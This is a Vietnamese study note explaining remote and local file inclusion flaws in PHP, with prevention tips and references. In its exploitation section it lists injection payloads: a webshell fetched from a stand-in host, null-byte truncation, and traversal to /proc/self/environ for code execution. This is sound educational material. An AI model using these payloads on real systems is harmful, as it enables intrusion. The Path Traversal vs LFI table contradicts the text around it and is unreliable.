# I. Khái niệm File Inclusion
* Là một kiểu tấn công thường gặp ở các web app trong quá trình ***thực thi code*** trong một file nào đó
* Lỗ hổng này xảy ra khi app có những ***đường dẫn*** tới code thực thi, mà các đường dẫn này lại ***thông qua người dùng***, làm cho kẻ tấn công có thể "điều hướng" sang các files thực thi khác

## Phân loại:
### 1. Remote File Inclusion (RFI):
* Là việc include file từ một vị trí khác server, như là từ một ***server khác***
* File này thường được tải thông qua tham số mà người dùng cung cấp tới app dưới dạng ***HTTP*** hoặc ***FTP URI***

### 2. Local File Inclusion (LFI):
* Cũng giống RFI nhưng khác ở chỗ thay vì là file ở một chỗ khác thì là những files đã có sẵn ***trong server*** 

### **Sự khác nhau giữa Path Traversal và FLI:**
| Path Traversal | LFI |
| - | - |
| Chỉ có thể include hoặc xem file trong thư mục root | Có thể xem được file ngoài thư mục root |
| Có thể thực thi được code | Không thực thi được code |

<br><br>

# II. Cơ chế khai thác (xét với PHP)
* ***Khâu kiểm duyệt input người dùng*** cho các hàm gọi tới các files để thực thi còn chưa chặt chẽ (Các hàm: include, require, include_once, require_once...)
* Trong PHP có một cái directive (hiểu nôm na là "sự chỉ dẫn"), nếu được bật, cho phép các hàm ***sử dụng URL*** để lấy data từ nơi khác
    * versions <= 4.3.4: *allow_url_fopen*
    * versions 5.2.0: *allow_url_include*
* Từ phiên bản 5.x trở đi, directive này mặc định thì bị ***vô hiệu hóa***, còn các phiên bản về trước thì vẫn được bật ***mặc định***
* Để khai thác lỗ hổng này, kẻ tấn công sẽ ***thay thế param*** truyền vào các hàm này để làm nó include code bẩn ở nơi nào đó
* Dấu hiệu nhận biết: URL có dạng .php/&lt;param>

VD: Xét đoạn PHP sau, trong đó có chứa request đến một file
<div style="display:flex; justify-content: center;">
    <img src="./src/example.png" style="width: 90%">
</div>
    
* Có thể đoán mục đích ban đầu là include các files như english.php hay french.php để hiển thị ngôn ngữ lên app
* Nhưng qua tham số *language*, ta có thể "tiêm" một số payloads có dạng như sau:
    * language=http://evil.example.com/webshell.txt?: truyền vào một file file code bẩn (RFI)
    * language=C:\\\ftp\\\upload\\\exploit: thực thi code ở file đã có sẵn trong server có tên exploit.php (LFI)
    * language=C:\\\notes.txt%00: thậm chí có thể dùng null byte để truy cập được nhiều files hơn là mỗi php (từ phiên bản 5.3 không được sử dụng nữa)
    * language=../../../../../proc/self/environ%00: đọc nội dung của /proc/self/environ. Qua đó có thể điều chỉnh HTTP header (như User-Agent) để thực hiện RCE

<br><br>

# III. Cách phòng chống
* Cần có khâu kiểm duyệt user input chặt chẽ 
    * Sử dụng whitelist
* Với các phiên bản PHP thấp, tắt allow_url_fopen và allow_url_include, hoặc cập nhật lên phiên bản PHP cao hơn

<br><br>

# Một số tools khai thác:
* fimap

<br><br>

# Tài liệu tham khảo:
* https://en.wikipedia.org/wiki/File_inclusion_vulnerability
* https://viblo.asia/p/file-inclusion-vulnerability-exploit-4P856NMa5Y3
* https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
* RFI:
    * https://www.invicti.com/learn/remote-file-inclusion-rfi/
    * https://www.imperva.com/learn/application-security/rfi-remote-file-inclusion/#:~:text=Remote%20file%20inclusion%20(RFI)%20is,located%20within%20a%20different%20domain.
    * https://www.acunetix.com/blog/articles/remote-file-inclusion-rfi/
* LFI:
    * https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/
